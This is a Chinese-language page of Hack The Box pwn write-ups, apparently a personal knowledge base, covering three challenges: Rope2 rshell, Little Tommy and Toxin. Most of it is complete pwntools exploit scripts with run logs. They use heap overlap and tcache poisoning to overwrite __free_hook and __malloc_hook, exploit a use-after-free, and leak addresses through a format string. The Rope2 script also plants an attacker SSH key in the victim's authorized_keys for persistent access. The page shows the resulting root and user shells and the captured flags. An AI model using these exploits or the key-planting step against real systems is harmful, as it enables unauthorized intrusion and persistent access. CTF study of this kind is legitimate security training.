(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2a0(freed) ) <-- fake1
(0x80)   tcache_entry[6](2): 0x55555555c400 (overlap chunk with 0x55555555c450(freed) )
(0xa0)   tcache_entry[8](7): 0x55555555c3e0 (overlap chunk with 0x55555555c3d0(freed) )
```

因此，可以获得块fake1，并使用它来修改当前位于0x50 tcache中的块B。如果用一个指针替换当前为null(表示链表的结束)的第一个单词，该指针有效地连接了tcache列表。

``` bash
add('K', 0x50, p64(0)*3 + p64(0x51) + p64(libc.symbols['__free_hook']-8)) # add free hook to tcache 0x50
rm('K')               # free file
```

运行完这些之后，指针被添加:

``` bash
0x55555555c280: 0x0000000000000000      0x0000000000000061
0x55555555c290: 0x0000000000000000      0x000055555555c010
0x55555555c2a0: 0x0000000000000000      0x0000000000000051
0x55555555c2b0: 0x00007ffff7fc65a0      0x000055555555000a  <-- free_hook in tcache
0x55555555c2c0: 0x0000000000000000      0x0000000000000000
```

在heapinfo中显示:

``` bash
(0x50)   tcache_entry[3](1): 0x55555555c2b0 --> 0x7ffff7fc65a0
```

需要去掉2b0块:

``` bash
# clear from tcache with add, shrink, rm
add('J', 0x40)
edit('J', 0x10)
rm('J')
```

现在只要添加一个0x40字节的条目，然后释放它。

``` bash
add('hook', 0x40, b"/bin/sh\x00" + p64(libc.symbols['system']))
rm('hook', wait=False)
p.interactive()
```

 - __free_hook Payload

payload也有点棘手。一旦写入__free_hook，不能释放它而不造成崩溃，所以两个文件都被有效地使用了。 为了解决这个问题，将把这个块指向__free_hook之前的8个字节。将用"/bin/sh\x00"覆盖这些字节，然后继续系统地址。这样，当程序读取块内容(或将其传递给_free_hook)时，就会得到字符串“/bin/sh”。

#### shell

最后的脚本在这里。因为PwnTools中的shell不是很好，所以为远程目标添加了一行代码，以便自动编写创建authorized_keys文件，这样就可以直接跳转到SSH连接。

 - pwn_rshell.py

``` bash
#!/usr/bin/env python3

import pdb
from pwn import *


prompt = '$ '

def ls():
    p.sendline('ls')
    res = p.recvuntil(prompt)
    for line in res.split(b'\n')[:-1]:
        print(line.decode())

def add(name, size, content='x'):
    p.sendline(f'add {name}')
    res = p.recvuntil(('size: ', prompt))
    if res.endswith(prompt.encode()): 
        pdb.set_trace()
        return
    p.sendline(f'{size}')
    if size > 0:
        p.recvuntil('content: ')
        p.sendline(content)
    res = p.recvuntil(prompt)
    return res
    
def rm(name, wait=True):
    p.sendline(f'rm {name}')
    if wait:
        p.recvuntil(prompt)

def edit(name, size, content='x'):
    p.sendline(f'edit {name}')
    res = p.recvuntil(('size: ', prompt))
    if res == prompt: 
        pdb.set_trace()
        return
    p.sendline(f'{size}')
    if size > 0:
        p.recvuntil('content: ')
        p.send(content)
    p.recvuntil(prompt)


rshell = ELF('./rshell')
libc = ELF('./libc.so.6-ropetwo')

if args.REMOTE:
    remote = ssh(host='10.10.10.196', user='chromeuser', keyfile='/root/hackthebox/machine/rope2/id_rsa')
    

while True:
    if args.REMOTE:
        p = remote.run('rshell')
    else:
        p = process('./rshell')
    p.recvuntil('$ ')

    # Create overlaps for end
    add('A', 0x40, p64(0)*5 + p64(0x61) + p64(0))   # A at 260 in f1
    add('B', 0x40)                                  # B at 2b0 in f2
    rm('A')                                         # A in 0x50 tcache, f1 empty
    edit('B', 0)                                    # B -> A in 0x50 tcache, f2 still B
    add('B2', 0x40)                                 # A in 0x50 tcache, f1 & f2 -> B
    rm('B')                                         # B -> A in 0x50 tcache, f1 -> B
    edit('B2', 0x40, '\x90')                        # B -> fake1 in 0x50 tcache, f1 -> B
    add('B3', 0x40)                                 # fake in 0x50 tcache, f2 -> B
    edit('B3', 0x20)                                # B-end in 0x20 tcache
    rm('B3')                                        # B in 0x30 tcache
    add('fake1', 0x40, p64(0)*3 + p64(0x51) + p64(0))
    rm('fake1')
    rm('B2')

    add('x', 0x30)                                  # add for spacing
    rm('x')

    add('C', 0x60)   # create block to be freed and steal pointer in tcache - C = 340
    add('D', 0x70, p64(0)*5 + p64(0xa1) + p64(0)) # create block and fake block to put fake block meta in place - D = 3b0
    rm('D') # D in tcache 0x80
    add('E', 0x60, p64(0x21)*11)   # create second 0x60, E, and spray with 0x21 for next block meta fake later, E = 430
    rm('C')               # f1 empty, C in 0x70 tcache
    edit('E', 0)      # slot 2 -> E, E->C in 0x70 tcache
    add('E2', 0x60)  # slots 1 and 2 -> E, C in 0x70 tcache
    rm('E')               # slot 1 -> E, E -> C in 0x70 tache
    edit('E2', 0x60, b'\xe0') # edit tcache pointer, C -> fake2 in 0x70 tcache

    # next three fetch C from tcache, and get rid of it without putting it back in 0x70 tcache
    add('E3', 0x60)   # fetch E, fake in 0x70 tcache
    edit('E3', 0x20)  # E-end in 0x30 tcache
    rm('E3')          # E in 0x50 tcache

    add('fake2', 0x60, p64(0)*9 + p64(0x31) + p64(0))   # get fake block, change key for E
    rm('E2') # C
    add('B', 0x70) # B

    # free fake to fill tcache, then overwrite key protecting from double free
    for i in range(7):
        edit('fake2', 0x0)    # free fake block, put 2f0 in 0x90 tcache
        edit('B', 0x70, p64(0)*5 + p64(0xa1) + p64(0) + chr(i).encode()) # B

    rm('B') # B
    rm('fake2')

    # modify libc address
    add('B', 0x70)
    edit('B', 0x70, p64(0)*5 + p64(0xa1) + b"\x60\x47")
    rm('B')

    add('F', 0x30)           # fetch 460 chunk from tcache, 300 still in 0x40 tcache
    edit('F', 0)             # 460 -> 300 in 0x40 tcache, f1 -> 460
    add('F2', 0x30)          # f1 and f2 -> 460, 300 in 0x40 tcache
    rm('F')                  # f2 -> 460, 460 -> 300 in 0x40 tcache
    edit('F2', 0x30, '\xe0') # 460 -> 3e0 -> stdout in 0x40 tcache

    # get 460 from tcahce, shrink it, and release it
    add('F3', 0x30)
    edit('F3', 0x10)
    rm('F3')

    # get 3e0 from tcache, shrink it, and release it
    add('fake3', 0x30)       
    edit('fake3', 0x10)
    rm('fake3')

    # clean up F2
    edit('F2', 0x10, p64(0)*2) # overwrtie pointer and key to allow double free
    rm('F2')

    try:
        leak = add('stdout', 0x30, p64(0xfbad1800) + p64(0)*2 + b"\x00"*7)
        if b'\x7f' not in leak:
            log.failure("Failed")
        else:
            break
    except EOFError:
        log.failure("Failed")

leaked_addr = u64(leak[8:16])
log.success(f'Leaked address: 0x{leaked_addr:x}')
libc.address = leaked_addr - 0x1e7570
log.success(f'Libc base: 0x{libc.address:x}')

log.info("Overwriting __free_hook")
add('K', 0x50, p64(0)*3 + p64(0x51) + p64(libc.symbols['__free_hook']-8)) # add free hook to tcache 0x50
rm('K')               # free file

# clear from tcache with add, shrink, rm
add('J', 0x40)
edit('J', 0x10)
rm('J')
add('hook', 0x40, b"/bin/sh\x00" + p64(libc.symbols['system']))
log.info("Triggering shell")
rm('hook', wait=False)
if args.REMOTE:
    p.sendline('echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+Tuty8485wlno7YD87opBzB3ehsFJN475yHgPuJV+t1oAk7UwtpLQLWbqa5SCpNbJtCeOK5L/He/F0Oe2D0UOZ5klMrcQGWqml1SpQTPHlpRQbTLdi6mMcsKhyHdJV5RqtqfFnPNdS4qF7k6COpOr/9S/UOr1V/zy/0vd2Bqqf9+K5s8xc+kNnfhfnYjWdlXP/avMFg7kRm4bTxJXlI2gGKF3LTw/iIbZ+5o/jY68UFq1NXk3Gtuv0ObVaRDU5f/7SlfqHKJUjQKkaqUdpAYOyGUY9uorYJe9GGor5+YyYysKCXkbhFvr28KqK/FsSBKCdEQM+z1nwyLXA2EArcqbgM6GQrfRcdHTmaMwP+Ti4F9iFD6r1DVrJpKZ4HinpDRtvQQncmtaUew5t78Z8a55zMWqV90A447y0Qg0nRxEa8gDr/PHOvcUmpKy3ocmwKD7x8ZEgNRvpm0INCOOcnjasddE/zrukoo1+fwzNB3R2lnghsNa8ShoctkAbgZmrSU= root@kali" > /home/r4j/.ssh/authorized_keys')
    p.sendline("chmod 600 /home/r4j/.ssh/authorized_keys")
    log.success("Wrote SSH key to /home/r4j/.ssh/authorized_keys")
p.interactive()
```

运行它会返回一个shell:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/rope2]
└─# python3 pwn_rshell.py REMOTE
[*] '/root/hackthebox/machine/rope2/rshell'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/root/hackthebox/machine/rope2/libc.so.6-ropetwo'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Connecting to 10.10.10.196 on port 22: Done
[ERROR] python is not installed on the remote system '10.10.10.196'
[*] chromeuser@10.10.10.196:
    Distro    Unknown Unknown
    OS:       Unknown
    Arch:     Unknown
    Version:  0.0.0
    ASLR:     Disabled
    Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
[+] Opening new channel: 'rshell': Done
[-] Failed
[+] Opening new channel: 'rshell': Done
[-] Failed
[+] Opening new channel: 'rshell': Done
[+] Leaked address: 0x7f96ffdd6570
[+] Libc base: 0x7f96ffbef000
[*] Overwriting __free_hook
[*] Triggering shell
[+] Wrote SSH key to /home/r4j/.ssh/authorized_keys
[*] Switching to interactive mode
$ $ $ $ id
uid=1000(r4j) gid=1001(chromeuser) groups=1001(chromeuser)
$ $ whoami
r4j
$ $ ls
chrome    web
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rope2-rshell.jpg)

SSH也可以正常连接:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/rope2]
└─# ssh -i id_rsa r4j@10.10.10.196
Welcome to Ubuntu 19.04 (GNU/Linux 5.0.0-38-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Feb 21 14:56:24 UTC 2021

  System load:  0.04               Processes:             302
  Usage of /:   42.8% of 19.56GB   Users logged in:       0
  Memory usage: 39%                IP address for ens160: 10.10.10.196
  Swap usage:   0%


454 updates can be installed immediately.
0 of these updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings


Last login: Sun Feb 21 14:53:20 2021 from 10.10.14.6
r4j@rope2:~$ id
uid=1000(r4j) gid=1000(r4j) groups=1000(r4j)
r4j@rope2:~$ whoami
r4j
r4j@rope2:~$ ls
user.txt
r4j@rope2:~$ cat user.txt
77fad0ddf2c6c7736a86ce77a44c204f
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rope2-rshell1.jpg)

<font color="red">***Damn! Really Crazy! Ha?***</font>
<!-- kb:end hackthebox-rope2-rshell-exploit -->

</details>

<a id="case-little-tommy"></a>

## 悬空账户指针与 memo 重用

账户释放后指针仍被显示逻辑使用，新分配的 memo 重用同一堆块。保留字段布局、覆盖位置和本地到远程的脚本。

<p class="kb-provenance">来源 little-tommy · 原记录 2021-09-09 · 9 个代码块 · 10 处图片引用</p>

<details class="kb-evidence" id="record-little-tommy">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start little-tommy -->

#### 详细过程及exp
#### 1. Basic checks:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/little_tommy]
└─# file little_tommy
little_tommy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=861838865726f48aa954b8df920d1be3ae683b40, not stripped
┌──(root💀kali)-[~/hackthebox/challenge/pwn/little_tommy]
└─# checksec little_tommy
[*] '/root/hackthebox/challenge/pwn/little_tommy/little_tommy'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```



#### 2. General overview:

There are 5 options to chose from.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy.jpg)

The first function "Create account" (1) allocates 72B of space on the heap with malloc().

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy1.jpg)

The maximum length of (2) "First name" could be 32B as well as the maximum length of (3) "Last name".

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy2.jpg)

The second option "Display account" prints 0–31B stored on the heap of "First name", 32–64B of "Last name" and 65 — 72B of "Account balance".

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy3.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy4.jpg)

The third function deletes the account by calling free() on the space pointed by *main_account.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy5.jpg)

The fourth option "Add memo" copies user input to the heap.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy6.jpg)

Last option prints the flag if there is an account created and 64 — 72 bytes of the space of the account variable (which are stored on the heap) are set to 0x6b637566 which means in ASCII "fuck".

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy7.jpg)

#### 3. Spot the vulnerability:

There is a [Use-After-Free](https://encyclopedia.kaspersky.com/glossary/use-after-free/) — vulnerability related to incorrect use of dynamic memory during program operation.

If you first create an account the pointer used for dynamic memory allocation will point at the end of the chunk (1).

If you delete it, then the pointer, instead of being set to null continues to refer to the now-freed memory, the result is a dangling pointer (2).

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy8.jpg)

If the program then allocates this same chunk of memory to *memo (3) the dangling pointer will now reference this new data set.

So at the end *main_account + 0x40 will be overflowed by 64–72B added by "Add memo" functionality (4).

#### 4. Exploit the Use-After-Free vulnerability locally:

First — create an account with random data (could be blank).

``` bash
Please enter an operation number: 1

First name: aaaa
Last name: aaaa

Thank you, your account number 155584960.
```

Then delete this account - to set the dangling pointer at the beginning.

``` bash
Please enter an operation number: 3

Account deleted successfully
```

Add memo - to overwrite the dynamic memory space referenced by *main_account with custom bytes, thus overwriting 0x40B with "fuck"

``` bash
Please enter an operation number: 4

Please enter memo:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaafuck

Thank you, please keep this reference number number safe: 155584960.
```

Use the 5th option to read the flag since both conditions are True.

``` bash
Please enter an operation number: 5
/bin/cat: flag: 没有那个文件或目录
```

#### 5. Final exploit:

 - getflag.py

``` python
from pwn import *

context.log_level = 'debug'

p = remote('188.166.173.208', 30638)
print p.recvuntil('number:')
p.sendline('1')
print p.recvuntil('name:')
p.sendline('aaaa')
print p.recvuntil('name:')
p.sendline('aaaa')
print p.recvuntil('number:')
p.sendline('4')
print p.recvuntil('memo:')
p.sendline('ffff')
print p.recvuntil('number:')
p.sendline('3')
print p.recvuntil('number:')
p.sendline('1')
print p.recvuntil('name:')
p.sendline('bbbb')
print p.recvuntil('name:')
p.sendline('bbbb')
print p.recvuntil('number:')
p.sendline('3')
print p.recvuntil('number:')
p.sendline('4')
print p.recvuntil('memo:')
p.sendline('aaaa' * 16 + 'fuck')
print p.recvuntil('number:')
p.sendline('5')
print p.recv()
p.interactive()
```

``` bash
Please enter an operation number:
[DEBUG] Sent 0x2 bytes:
    '5\n'

[*] Switching to interactive mode
[DEBUG] Received 0x3 bytes:
    '5\r\n'

[DEBUG] Received 0x9e bytes:
    'HTB{I_am_so_heaped_up_right_now}\r\n'
    '\r\n'
    '1. Create account\r\n'
    '2. Display account\r\n'
    '3. Delete account\r\n'
    '4. Add memo\r\n'
    '5. Print flag\r\n'
    '\r\n'
    'Please enter an operation number: '
```

 - getflag1.py

``` python
from pwn import *
from time import sleep

context.log_level = 'debug'

p = remote("188.166.173.208", 30638)

p.recvline("Please enter an operation number:")
sleep(1)
p.sendline("1")
sleep(1)
p.recvline("First name:")
p.sendline("luci")
sleep(1)
p.recvline("Last name:")
p.sendline("luci")
sleep(1)
p.recvline("Please enter an operation number:")
p.sendline("3")
p.recvline("Account deleted successfully")
sleep(1)
p.recvline("Please enter an operation number:")
p.sendline("4")
sleep(1)
p.recvline("Please enter memo:")
p.sendline("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAfuck")
p.recvline("Thank you, please keep this reference number number safe:")
sleep(1)
p.recvline("Please enter an operation number:")
p.sendline("5")

p.interactive()
```

``` bash
Please enter an operation number: [DEBUG] Received 0x3 bytes:
    '5\r\n'

[DEBUG] Received 0x9e bytes:
    'HTB{I_am_so_heaped_up_right_now}\r\n'
    '\r\n'
    '1. Create account\r\n'
    '2. Display account\r\n'
    '3. Delete account\r\n'
    '4. Add memo\r\n'
    '5. Print flag\r\n'
    '\r\n'
    'Please enter an operation number: '
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy9.jpg)

#### 摘自(致敬原作)......

 - 浏览medium.com博客每月有次数限制，并且5$收费，故摘录文章。。。
 - [PWN Little Tommy challenge - HTB](https://karol-mazurek95.medium.com/pwn-little-tommy-challenge-htb-46016104f09f)

<!-- kb:end little-tommy -->

</details>

<a id="case-toxin"></a>

## 格式化泄漏与 tcache poisoning

两份实现分别分析地址泄漏、释放状态和分配重定向。保留 toxinfreed 周边偏移、libc 对应版本与最终 hook 修改脚本。

<p class="kb-provenance">来源 toxin · 原记录 2021-02-22 · 31 个代码块 · 20 处图片引用</p>

<details class="kb-evidence" id="record-toxin">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start toxin -->

#### walkthrough-1

所给的LIBC文件暗示了运行在Ubuntu 18.04上的二进制文件，也就是Bionic Beaver。



使用IDA，这里是函数的伪代码:

 - add 函数

add函数如下:

``` bash
int add_toxin()
{
  int v1; // ebx
  int v2; // [rsp+4h] [rbp-1Ch] BYREF
  size_t size[3]; // [rsp+8h] [rbp-18h] BYREF

  puts("A new toxin! Fascinating.");
  printf("Toxin chemical formula length: ");
  __isoc99_scanf("%lu", size);
  if ( size[0] > 0xE0 )
    return puts("Chemical formula too long.");
  printf("Toxin index: ");
  __isoc99_scanf("%d", &v2);
  if ( v2 < 0 || v2 > 2 || *((_QWORD *)&toxins + v2) )
    return puts("Invalid toxin index.");
  sizes[v2] = size[0];
  v1 = v2;
  *((_QWORD *)&toxins + v1) = malloc(size[0]);
  printf("Enter toxin formula: ");
  return read(0, *((void **)&toxins + v2), size[0]);
}
```

这个函数负责的大小和通过malloc分配一块用给定的大小, 并将其添加到gloabl指针toxins, 这个函数的takeaways是大小限制是可以分配块高达0x70大小和给出的指标必须在index < 0 || index > 2会抛出一个错误,一样如果块占据global数组,它会抛出的错误。

 - free 函数

这个函数处理这个二进制文件的free功能:

``` bash
void drink_toxin()
{
  int v0; // [rsp+Ch] [rbp-4h] BYREF

  puts("This is dangerous testing, I'm warning you!");
  printf("Toxin index: ");
  __isoc99_scanf("%d", &v0);
  if ( v0 >= 0 && v0 <= 2 && *((_QWORD *)&toxins + v0) )
  {
    if ( toxinfreed )
    {
      puts("You can only drink toxins once, they're way too poisonous to try again.");
    }
    else
    {
      toxinfreed = 1;
      free(*((void **)&toxins + v0));
    }
  }
  else
  {
    puts("Invalid toxin index.");
  }
}
```

这个函数也有约束，包括只能调用一次free，这意味着只能有一个free chunk。虽然当它free(toxins[index])时，它不会消除可能导致在释放后使用的块。它也不会使全局指针将toxins[index]置为0，这使得这种情况变得困难，因为即使释放了这个函数，也无法分配新的块，这使得无法分配块，除非全局指针没有被置空。

 - edit函数

``` bash
int edit_toxin()
{
  int v1; // [rsp+Ch] [rbp-4h] BYREF

  puts("Adjusting an error?");
  printf("Toxin index: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 < 0 || v1 > 2 || !*((_QWORD *)&toxins + v1) )
    return puts("Invalid toxin index.");
  printf("Enter toxin formula: ");
  return read(0, *((void **)&toxins + v1), sizes[v1]);
}
```

函数负责编辑alloctaed块,虽然使用这个,因为它只检查全局指针是否不为空或free函数并不是空的,全球指针,用free漏洞后,有能力覆盖fd & bk指针free的一部分。

 - search函数

这个函数允许从全局指针中搜索一个块，但是printf在这里有一个问题。

``` bash
int search_toxin()
{
  int i; // [rsp+4h] [rbp-Ch]
  char s[6]; // [rsp+Ah] [rbp-6h] BYREF

  puts("Time to search the archives!");
  memset(s, 0, sizeof(s));
  printf("Enter search term: ");
  read(0, s, 5uLL);
  for ( i = 0; i <= 2; ++i )
  {
    if ( *((_QWORD *)&toxins + i) && !strcmp(s, *((const char **)&toxins + i)) )
      return printf("Found at index %d!\n", (unsigned int)i);
  }
  printf(s);
  return puts(" not found.");
}
```

给定搜索字符串，它将搜索分配的块(drink)，然后不指定任何内容就输出给定的模式，这使得格式化字符串漏洞容易受到攻击。

#### 漏洞利用

利用这一点的方法如下:

 - 从search_toxin函数的格式字符串漏洞中泄漏LIBC和ELF地址。
 - 分配一个块。
 - 释放那个块
 - 用toxinfreed - 0x13的地址编辑该块，该地址指向一个有效的空闲块指针。
 - 然后为返回第一个释放的指针进行一次分配，然后为第三次分配返回toxinfreed地址。
 - 用指向__malloc_hook的指针覆盖toxins数组的第一个索引，然后清空toxins数组中的其他块。
 - 编辑chunk 0，因为它被___malloc_hook覆盖了，所以用one_gadget覆盖它
 - 再做一次分配，最终调用__malloc_hook，导致one_gadget跳转并获得shell。

继续，构建实用的函数:

``` bash
from pwn import *
p = remote("139.59.162.195", 31794)
elf = ELF("toxin")
libc = elf.libc
def alloc(idx, size, content):
    p.sendlineafter("> ", "1")
    p.sendlineafter(": ", str(size))
    p.sendlineafter(": ", str(idx))
    p.sendafter(": ", content)
def edit(idx, content):
    p.sendlineafter("> ", "2")
    p.sendlineafter(": ", str(idx))
    p.sendafter(": ", content)
def free(idx):
    p.sendlineafter("> ", "3")
    p.sendlineafter(": ", str(idx))
def search_toxin(string):
    p.sendlineafter("> ", "4")
    p.sendlineafter(": ", string)
```

现在，这些函数将帮助更自由地与二进制文件交互，然后已经泄漏了位于第3和第9索引的search_toxin的LIBC和ELF地址。

``` bash
search_toxin("%3$p")
libc.address = int(p.recvline().strip(b"\n"), 16) - 0x110081
log.info("LIBC: 0x%x" %(libc.address))

search_toxin("%9$p")
elf.address = int(p.recvline().strip(b"\n"), 16) - 0x1284
log.info("ELF: 0x%x" %(elf.address))
```

然后，在索引0处分配一个chunk并释放它:

``` bash
alloc(0, 0x70, "AAAA")
free(0)
```

现在，用toxinfreed - 0x13重写被释放块的fd，它与大小为0x7f的块的结构相同。

``` bash
root@luci:~/toxin# gdb -q -p $(pidof toxin)
gef➤  x/12xg &toxinfreed
0x55cc26b80050 <toxinfreed>:	0x0000000000000001	0x0000000000000000
0x55cc26b80060 <toxins>:	0x000055cc27953260	0x0000000000000000
0x55cc26b80070 <toxins+16>:	0x0000000000000000	0x0000000000000000
0x55cc26b80080 <sizes>:	0x0000000000000070	0x0000000000000000
0x55cc26b80090 <sizes+16>:	0x0000000000000000	0x0000000000006000
0x55cc26b800a0:	0x0000000000000000	0x0001000300000000
gef➤  x/2xg 0x55cc26b80050 - 0x13
0x55cc26b8003d:	0xa60edac680000000	0x000000000000007f
```

正如所见，大小为0x7f，它与块的结构完全相同。

``` bash
edit(0, p64(elf.symbols['toxinfreed'] - 0x13))
```

现在。将再进行一次分配，在索引2处进行第二次分配时，将返回toxinfreed的目标块。

``` bash
alloc(1, 0x70, "BBBBB")
```

现在。将制作一个payload，它将覆盖toxinfreed，以及使用__malloc_hook作为toxinsfreed变量的toxins第一个块的索引，toxins被传染到存储。

``` bash
payload = b"\x00"*35
payload += p64(libc.symbols['__malloc_hook'])
payload += p64(0)*3
payload += p64(0x70)
alloc(2, 0x70, payload)
```

``` bash
gef➤  x/12xg &toxinfreed
0x563d2b4fc050 <toxinfreed>:	0x0000000000000000	0x0000000000000000
0x563d2b4fc060 <toxins>:	0x00007f80a8ecec30	0x0000000000000000
0x563d2b4fc070 <toxins+16>:	0x0000000000000000	0x0000000000000000
0x563d2b4fc080 <sizes>:	0x0000000000000070	0x0000000000000070
0x563d2b4fc090 <sizes+16>:	0x0000000000000070	0x0000000000006000
0x563d2b4fc0a0:	0x0000000000000000	0x0001000300000000
gef➤  p __malloc_hook
$1 = (void *(*)(size_t, const void *)) 0x0
gef➤  p &__malloc_hook
$2 = (void *(**)(size_t, const void *)) 0x7f80a8ecec30 <__malloc_hook>
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/toxin.jpg)

覆盖toxins数组，第0个索引是指向__malloc_hook的指针。

现在，请求索引为0的edit函数，由于被__malloc_hook覆盖，它只返回那个指针，用one_gadget地址覆盖它。

``` bash
edit(0, p64(libc.address + 0x10a38c))
```

现在，由于用one_gadget覆盖了__malloc_hook，请求更多的块，这反过来又从add函数调用malloc，并最终调用__malloc_hook:

``` bash
p.sendlineafter("> ", "1")
p.sendlineafter(": ", str(0x70))
p.sendlineafter(": ", "1")
p.interactive()
```

运行漏洞利用脚本:

``` bash
root@luci:~/toxin# python getshell.py 
[+] Starting local process './toxin': pid 32112
[*] '/root/toxin/toxin'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  './lib/'
[*] u'/root/toxin/lib/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] LIBC: 0x7ff133760000
[*] ELF: 0x5626d4538000
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$ whoami
root
$ ls
getshell.py  lib  peda-session-toxin.txt  toxin
```

成功的获取了本地的shell

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/toxin1.jpg)

然后，修改成远程ip和端口之后运行它，得到了flag:

``` bash
root@luci:~/toxin# python getshell.py 
[+] Opening connection to 46.101.84.35 on port 31348: Done
[*] '/root/toxin/toxin'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  './lib/'
[*] u'/root/toxin/lib/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] LIBC: 0x7f0fa8d08000
[*] ELF: 0x55d49667f000
[*] Switching to interactive mode
$ 
$ 
$ id
uid=1000(pwn) gid=1000(pwn) groups=1000(pwn)
$ whoami
pwn
$ ls
flag.txt
lib
toxin
$ cat flag.txt
HTB{tc4ch3_t0x1n4t10n???_0r_tc4ch3_p01So1n1NG??+F0rm4t...4m@ZiNg!!!}
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/toxin2.jpg)

#### 完整exp脚本

 - getflag.py

``` bash
from pwn import *

#context.update(os="linux",arch="amd64",log_level="debug")
#context.terminal = ['tmux','split','-h']

p = remote("46.101.84.35", 31348)
#p = process('./toxin')
elf = ELF("toxin")
libc = elf.libc

def alloc(idx, size, content):
    p.sendlineafter("> ", "1")
    p.sendlineafter(": ", str(size))
    p.sendlineafter(": ", str(idx))
    p.sendafter(": ", content)
def edit(idx, content):
    p.sendlineafter("> ", "2")
    p.sendlineafter(": ", str(idx))
    p.sendafter(": ", content)
def free(idx):
    p.sendlineafter("> ", "3")
    p.sendlineafter(": ", str(idx))
def search_toxin(string):
    p.sendlineafter("> ", "4")
    p.sendlineafter(": ", string)

search_toxin("%3$p")
libc.address = int(p.recvline().strip(b"\n"), 16) - 0x110081
log.info("LIBC: 0x%x" %(libc.address))

search_toxin("%9$p")
elf.address = int(p.recvline().strip(b"\n"), 16) - 0x1284
log.info("ELF: 0x%x" %(elf.address))

alloc(0, 0x70, "AAAA")
free(0)
edit(0, p64(elf.symbols['toxinfreed'] - 0x13))

alloc(1, 0x70, "BBBBB")

payload = b"\x00"*35
payload += p64(libc.symbols['__malloc_hook'])
payload += p64(0)*3
payload += p64(0x70)
alloc(2, 0x70, payload)

edit(0, p64(libc.address + 0x10a38c))
p.sendlineafter("> ", "1")
p.sendlineafter(": ", str(0x70))
p.sendlineafter(": ", "1")
p.interactive()
```

#### walkthrough-2

Tcache poisoning & One Gadget & __malloc_hook [x64]

Basic checks:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Toxin]
└─# file toxin 
toxin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./lib/ld-2.27.so, BuildID[sha1]=c462dc6a106ccb8acb90b34ae93bc673a3010eda, for GNU/Linux 3.2.0, not stripped
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Toxin]
└─# checksec toxin
[*] '/root/hackthebox/challenge/pwn/Toxin/toxin'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./lib/'
```

General overview:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Toxin]
└─# ./toxin 
Welcome to Toxin, a low-capacity lab designed to store, record and keep track of chemical toxins.
1. Record toxin
2. Edit existing toxin record
3. Drink toxin for testing
4. Search for toxin record
Enter your lab code.
>
```

There are 4 main functionalities in the binary:

1. Record toxin — which basically allocates a new chunk on the heap.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/toxin3.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/toxin4.jpg)

2. Edit existing toxin record — which allows you to overwrite the Forward Pointer of the freed chunk (it will be covered later keep reading...)

